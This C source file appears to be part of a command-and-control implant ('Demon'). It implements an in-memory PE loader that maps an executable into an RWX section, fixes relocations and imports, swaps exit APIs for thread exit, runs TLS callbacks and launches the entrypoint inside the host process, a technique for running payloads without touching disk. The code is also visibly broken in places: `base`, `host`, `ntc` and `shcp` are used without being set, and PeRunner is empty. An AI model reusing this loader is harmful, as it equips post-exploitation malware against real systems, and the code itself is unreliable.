
#include <Demon.h>

#include <Core/WinUtils.h>
#include "Common/Defines.h"
#include <Core/MiniStd.h>
#include <Core/Package.h>
#include "Common/Macros.h"
#include <Core/Parser.h>

#include <Inject/InjectUtil.h>

#include <Loader/PeLdr.h>
#include <Loader/ObjectApi.h>

// check each exit-related api with name provided
// return TRUE if found, else FALSE
BOOL IsExitAPI( PCHAR name )
{
    DWORD hash = HashStringA( name );
    switch ( hash )
    {
        case 0xb769339e:
            // ExitProcess
            return TRUE;
        case 0x7c967e3f:
            // exit
            return TRUE;
        case 0xeef86be:
            // _exit
            return TRUE;
        case 0xecb20121:
            // _cexit
            return TRUE;
        case 0x827b65e0:
            // _c_exit
            return TRUE;
        case 0xe785e51b:
            // quick_exit
            return TRUE;
        case 0xeddfa9e:
            // _Exit
            return TRUE;
        default:
            return FALSE;
    }
}

// https://github.com/TheWover/donut/blob/master/loader/inmem_pe.c
DWORD PeLdr( PCHAR EntryName, PVOID PeBytes, PVOID ArgData, SIZE_T ArgSize )
{
    PIMAGE_DOS_HEADER           dos, doshost;
    PIMAGE_NT_HEADERS           nt, nthost;
    PIMAGE_SECTION_HEADER       sh;
    PIMAGE_SECTION_HEADER       shcp = NULL;
    PIMAGE_THUNK_DATA           oft, ft;
    PIMAGE_IMPORT_BY_NAME       ibn;
    PIMAGE_IMPORT_DESCRIPTOR    imp;
    PIMAGE_DELAYLOAD_DESCRIPTOR del;
    PIMAGE_EXPORT_DIRECTORY     exp;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK         *callbacks;
    PIMAGE_RELOC                list;
    PIMAGE_BASE_RELOCATION      ibr;
    IMAGE_NT_HEADERS            ntc;
    DWORD                       rva, size;
    PDWORD                      adr;
    PDWORD                      sym;
    PWORD                       ord;
    PBYTE                       ofs;
    PCHAR                       str, name;
    HMODULE                     dll;
    ULONG_PTR                   ptr;
    DllMain_t                   DllMain;            // DLL
    Start_t                     Start;              // EXE
    DllParam_t                  DllParam = NULL;    // DLL function accepting one string parameter
    DllVoid_t                   DllVoid  = NULL;    // DLL function that accepts no parametersd
    LPVOID                      base, host;
    DWORD                       i, cnt;
    HANDLE                      hThread;
    WCHAR                       buf[1024+1];
    DWORD                       size_of_img;
    PVOID                       baseAddress;
    SIZE_T                      numBytes;
    DWORD                       newprot, oldprot;
    NTSTATUS                    status;
    HANDLE                      hSection;
    LARGE_INTEGER               liSectionSize;
    PVOID                       cs = NULL;
    SIZE_T                      viewSize = 0;
    BOOL                        has_reloc;
    DWORD                       ret_val = 1;

    dos  = (PIMAGE_DOS_HEADER)PeBytes;
    nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);

    // before doing anything. check compatibility between exe/dll and host process.
    Instance.Win32.GetModuleHandleA( NULL );
    doshost = (PIMAGE_DOS_HEADER)host;
    nthost  = RVA2VA(PIMAGE_NT_HEADERS, host, doshost->e_lfanew);

    if ( nt->FileHeader.Machine != nthost->FileHeader.Machine )
    {
        PRINTF( "Host process %08lx and file %08lx are not compatible...cannot load.", 
            nthost->FileHeader.Machine, nt->FileHeader.Machine );
        return ret_val;
    }

    liSectionSize.QuadPart = nt->OptionalHeader.SizeOfImage;

    // check if the binary has relocation information
    size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    has_reloc = size == 0? FALSE : TRUE;
    if (!has_reloc)
    {
        PRINTF( "No relocation information present, setting the base to: 0x%p", (PVOID)nt->OptionalHeader.ImageBase );
        cs = (PVOID)nt->OptionalHeader.ImageBase;
    }

    PRINTF( "Creating section to store PE." );
    PRINTF( "Requesting section size: %d", nt->OptionalHeader.SizeOfImage);

    status = Instance.Win32.NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );
    if ( !NT_SUCCESS(status) )
        return ret_val;

    PRINTF( "Mapping local view of section to store PE." );
    status = Instance.Win32.NtMapViewOfSection( hSection, Instance.Win32.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE );
    if ( !NT_SUCCESS(status) && status != 0x40000003 )
        return ret_val;

    PIMAGE_NT_HEADERS ntnew   = RVA2VA( PIMAGE_NT_HEADERS, cs, dos->e_lfanew );

    PRINTF( "Mapped to address: 0x%p", cs );

    PRINTF( "Copying Headers" );
    PRINTF( "nt->FileHeader.SizeOfOptionalHeader: %d", nt->FileHeader.SizeOfOptionalHeader );
    PRINTF( "nt->OptionalHeader.SizeOfHeaders: %d", nt->OptionalHeader.SizeOfHeaders );

    PRINTF( "Copying first section" );
    PRINTF( "Copying %d bytes", nt->OptionalHeader.SizeOfHeaders );
    MemCopy( cs, base, nt->OptionalHeader.SizeOfHeaders );

    PRINTF( "DOS Signature (Magic): %08lx, %p", ((PIMAGE_DOS_HEADER)cs)->e_magic, &(((PIMAGE_DOS_HEADER)cs)->e_magic));
    PRINTF( "NT Signature: %lx, %p", ntnew->Signature, &(ntnew->Signature));

    PRINTF( "Updating ImageBase to final base address" );
    ntnew->OptionalHeader.ImageBase = (ULONGLONG)cs;
    PRINTF( "Updated ImageBase: %lluX", ntnew->OptionalHeader.ImageBase );

    PRINTF( "Copying each section to memory: %p", cs );
    sh = IMAGE_FIRST_SECTION( nt );
      
    for( i = 0; i < nt->FileHeader.NumberOfSections; i++ )
    {
        PBYTE dest = (PBYTE)cs + sh[i].VirtualAddress;
        PBYTE source = (PBYTE)base + sh[i].PointerToRawData;

        if ( sh[i].SizeOfRawData == 0 )
            PRINTF( "Section is empty of data, but may contain uninitialized data." );
      
        // Copy the section data
        MemCopy( dest, source, sh[i].SizeOfRawData );
      
        // Update the actual address of the section
        sh[i].Misc.PhysicalAddress = (DWORD)*dest;

        PRINTF( "Copied section name: %s", sh[i].Name);
        PRINTF( "Copied section source offset: 0x%X", sh[i].VirtualAddress);
        PRINTF( "Copied section dest offset: 0x%X", sh[i].PointerToRawData);
        PRINTF( "Copied section absolute address: 0x%lX", sh[i].Misc.PhysicalAddress);
        PRINTF( "Copied section size: 0x%lX", sh[i].SizeOfRawData);
    }
    
    PRINTF( "Sections copied." );

    ofs  = (PBYTE)cs - nt->OptionalHeader.ImageBase;

    if ( has_reloc && ofs != 0 )
    {
        PRINTF("Applying Relocations");
      
        rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        ibr = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
      
        while ((PBYTE)ibr < ((PBYTE)cs + rva + size) && ibr->SizeOfBlock != 0)
        {
            list = (PIMAGE_RELOC)(ibr + 1);
  
            while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock)
            {
                // check that the RVA is within the boundaries of the PE
                if (ibr->VirtualAddress + list->offset < nt->OptionalHeader.SizeOfImage)
                {
                    PULONG_PTR address = (PULONG_PTR)((PBYTE)cs + ibr->VirtualAddress + list->offset);
                    if (list->type == IMAGE_REL_BASED_DIR64) {
                        *address += (ULONG_PTR)ofs;
                    } else if (list->type == IMAGE_REL_BASED_HIGHLOW) {
                        *address += (DWORD)(ULONG_PTR)ofs;
                    } else if (list->type == IMAGE_REL_BASED_HIGH) {
                        *address += HIWORD(ofs);
                    } else if (list->type == IMAGE_REL_BASED_LOW) {
                        *address += LOWORD(ofs);
                    } else if (list->type != IMAGE_REL_BASED_ABSOLUTE) {
                        PRINTF( "ERROR: Unrecognized Relocation type %08lx.", list->type );
                        goto pe_cleanup;
                    }
                }
                list++;
            }
            ibr = (PIMAGE_BASE_RELOCATION)list;
        }
    }

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    if( rva != 0 )
    {
        PRINTF("Processing the Import Table");
      
        imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
        
        // For each DLL
        for ( ; imp->Name!=0; imp++ )
        {
            name = RVA2VA(PCHAR, cs, imp->Name);
        
            dll = LdrModuleLoad(name);
        
            // Resolve the API for this library
            oft = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk);
            ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
          
            // For each API
            for ( ; ; oft++, ft++ )
            {
                // No API left?
                if (oft->u1.AddressOfData == 0) break;
          
                // Resolve by ordinal?
                if ( IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal) )
                {
                    ft->u1.Function = (ULONG_PTR)Instance.Win32.GetProcAddress(dll, NULL, oft->u1.Ordinal);
                } else
                {
                    // Resolve by name
                    ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);

                    // run entrypoint as thread?
                    if( FALSE )
                    {
                        // if this is an exit-related API, replace it with RtlExitUserThread
                        if( IsExitAPI( ibn->Name ) )
                        {
                            PRINTF( "Replacing %s!%s with ntdll!RtlExitUserThread", name, ibn->Name );
                            ft->u1.Function = (ULONG_PTR)Instance.Win32.RtlExitUserThread;
                            continue;
                        }
                    }
                    ft->u1.Function = (ULONG_PTR)Instance.Win32.GetProcAddress(dll, ibn->Name, 0);
                }
            }
        }
    }

    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress;
    
    if( rva != 0 )
    {
        PRINTF( "Processing Delayed Import Table" );
      
        del = RVA2VA(PIMAGE_DELAYLOAD_DESCRIPTOR, cs, rva);
        
        // For each DLL
        for ( ; del->DllNameRVA != 0; del++ )
        {
            name = RVA2VA(PCHAR, cs, del->DllNameRVA);
          
            dll = LdrModuleLoad( name );
          
            if ( dll == NULL ) continue;
          
            // Resolve the API for this library
            oft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportNameTableRVA);
            ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportAddressTableRVA);
            
            // For each API
            for ( ; ; oft++, ft++ )
            {
                // No API left?
                if ( oft->u1.AddressOfData == 0 ) break;
  
                // Resolve by ordinal?
                if ( IMAGE_SNAP_BY_ORDINAL( oft->u1.Ordinal ) )
                {
                    ft->u1.Function = (ULONG_PTR)Instance.Win32.GetProcAddress( dll, NULL, oft->u1.Ordinal );
                } else
                {
                    // Resolve by name
                    ibn = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
                    ft->u1.Function = (ULONG_PTR)Instance.Win32.GetProcAddress( dll, ibn->Name, 0 );
                }
            }
        }
    }

    Start = RVA2VA(Start_t, cs, nt->OptionalHeader.AddressOfEntryPoint);

    PRINTF( "Unmapping temporary local view of section to persist changes." );
    status = Instance.Win32.NtUnmapViewOfSection( Instance.Win32.GetCurrentProcess(), cs );
    if ( ! NT_SUCCESS( status ) )
        goto pe_cleanup;

    // if no reloc information is present, make sure we use the preferred address
    if ( has_reloc )
    {
      PRINTF( "No relocation information present, so using preferred address..." );
      cs = NULL;
    }
    viewSize = 0;

    PRINTF( "Mapping writecopy local view of section to execute PE." );
    status = Instance.Win32.NtMapViewOfSection( hSection, Instance.Win32.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY );
    if ( ! NT_SUCCESS( status ) )
        goto pe_cleanup;

    PRINTF( "Mapped to address: 0x%p", cs );

    // start everything out as WC
    // this is because some sections are padded and you can end up with extra RWX memory if you don't pre-mark the padding as WC
    PRINTF( "Pre-marking module as WC to avoid padding between PE sections staying RWX." );
    Instance.Win32.VirtualProtect( cs, viewSize, PAGE_WRITECOPY, &oldprot );

    PRINTF( "Setting permissions for each PE section ");
    // done with binary manipulation, mark section permissions appropriately
    for ( i = 0; i < ntc.FileHeader.NumberOfSections; i++ )
    {
        BOOL isRead = (shcp[i].Characteristics & IMAGE_SCN_MEM_READ) ? TRUE : FALSE;
        BOOL isWrite = (shcp[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? TRUE : FALSE;
        BOOL isExecute = (shcp[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? TRUE : FALSE;

        if ( isWrite & isExecute )
            continue; // do nothing, already WCX
        else if ( isRead & isExecute )
            newprot = PAGE_EXECUTE_READ;
        else if ( isRead & isWrite & !isExecute )
        {
            newprot = PAGE_WRITECOPY; // must use WC because RW is incompatible with permissions of initial view (WCX)
        }
        else if ( !isRead & !isWrite & isExecute )
            newprot = PAGE_EXECUTE;
        else if ( isRead & !isWrite & !isExecute )
            newprot = PAGE_READONLY;

        baseAddress = (PBYTE)cs + shcp[i].VirtualAddress;

        if ( i < ( ntc.FileHeader.NumberOfSections - 1 ) )
            numBytes = ((PBYTE)cs + shcp[i+1].VirtualAddress) - ((PBYTE)cs + shcp[i].VirtualAddress);
        else
            numBytes = shcp[i].SizeOfRawData;

        oldprot = 0;

        PRINTF("Section name: %s", shcp[i].Name);
        PRINTF("Section offset: 0x%X", shcp[i].VirtualAddress);
        PRINTF("Section absolute address: 0x%p", baseAddress);
        PRINTF("Section size: 0x%llX", numBytes);
        PRINTF("Section protections: 0x%X", newprot);

        if ( ! ( Instance.Win32.VirtualProtect( baseAddress, numBytes, newprot, &oldprot ) ) )
            PRINTF("VirtualProtect failed: %d", inst->api.GetLastError());
    }

    // declare variables and set permissions of module header
    PRINTF( "Setting permissions of module headers to READONLY (%d bytes)", ntc.OptionalHeader.BaseOfCode );
    oldprot = 0;

    Instance.Win32.VirtualProtect( cs, ntc.OptionalHeader.BaseOfCode, PAGE_READONLY, &oldprot );

    status = Instance.Win32.NtFlushInstructionCache(Instance.Win32.GetCurrentProcess(), NULL, 0);
    if ( ! NT_SUCCESS( status ) )
        goto pe_cleanup;

    /** 
      Execute TLS callbacks. These are only called when the process starts, not when a thread begins, ends
      or when the process ends. TLS is not fully supported.
    */
    rva = ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;

    if ( rva != 0 ) 
    {
        PRINTF( "Processing TLS directory" );
          
        tls = RVA2VA(PIMAGE_TLS_DIRECTORY, cs, rva);
          
        // address of callbacks is absolute. requires relocation information
        callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
        PRINTF( "AddressOfCallBacks : %p", callbacks );

        if ( callbacks )
        {
            while( *callbacks != NULL )
            {
                // call function
                PRINTF( "Calling 0x%p", *callbacks );
                (*callbacks)((LPVOID)cs, DLL_PROCESS_ATTACH, NULL);
                callbacks++;
            }
        }
    }

    /*
    // set the command line
    if( ArgSize )
    {
        Instance.Win32.MultiByteToWideChar( CP_ACP, 0, ArgData, -1, buf, 1024 );
        PRINTF( "Setting command line: %ws", buf );
        SetCommandLineW(buf);
    }
    */

    PRINTF( "Executing entrypoint" );
    Start(NtCurrentTeb()->ProcessEnvironmentBlock);

    ret_val = 0;

pe_cleanup:

    return ret_val;
}

VOID PeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID PeBytes, SIZE_T PeBytesSize, PVOID ArgData, SIZE_T ArgSize )
{

}